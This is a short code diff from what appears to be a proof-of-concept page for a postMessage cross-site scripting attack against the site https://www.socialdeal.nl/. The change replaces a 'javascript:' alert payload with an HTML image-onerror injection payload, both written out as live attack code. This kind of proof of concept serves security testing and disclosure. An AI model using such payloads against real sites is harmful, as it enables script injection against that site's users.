@@ -9,7 +9,7 @@
     
     setTimeout(function(){
       victim.postMessage(
-        {action:"javascript:alert('xss')"},
+        {action:"<img src=xonerror=alert(0)>"},
         "https://www.socialdeal.nl/"
          );
       }, 3000);
